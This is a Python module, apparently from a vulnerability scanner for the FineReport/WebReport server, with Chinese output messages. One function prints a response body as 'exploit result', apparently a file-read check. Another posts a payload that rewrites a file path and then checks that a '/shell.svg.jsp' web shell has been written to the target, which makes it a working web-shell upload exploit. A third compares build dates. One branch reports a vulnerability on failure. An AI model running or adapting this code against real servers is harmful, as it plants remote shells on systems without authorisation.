import requests
from urllib3.exceptions import InsecureRequestWarning
import DataHandler.fingerprint_detection as finger

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def webReport_v8_vul(base_url, url, params, version, label):
    response = requests.get(url, params=params, verify=False)
    if response.status_code == 200 and "出错页面" not in response.text and response.text and "Tomcat" in response.text:
        print(f"[+] {base_url} 存在漏洞，漏洞名称为：{version}{label}")
        print("漏洞利用结果")
        print(response.text)
    else:
        print(f"{base_url} 不存在{version}{label}")


def webReport_v9_vul(server, endpoint, base_url, url, params, version, label):
    headers = {'content-type': 'application/json'}
    data = server['data']
    server['params']['filePath'] = server['params']['filePath'].replace('WebReport', endpoint)
    response = requests.post(url, params=params, data=data, verify=False)
    if response.status_code == 200:
        url = url + "/shell.svg.jsp"
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            print(f"[+] {base_url} 存在漏洞，漏洞名称为：{version}{label}")
        else:
            print(f"{base_url}不存在{version}{label}")
    else:
        print(f"{base_url} 存在 {version}{label}")


def webReport_channel_vul(base_url, version, label):
    jar_time, minor_version = finger.fingerprint(base_url)
    if jar_time < 'Build#persist-2023.07':
        print(f"[+] {base_url} 存在漏洞，漏洞名称为：{version}{label}")
    else:
        print(f"{base_url}不存在{version}{label}")
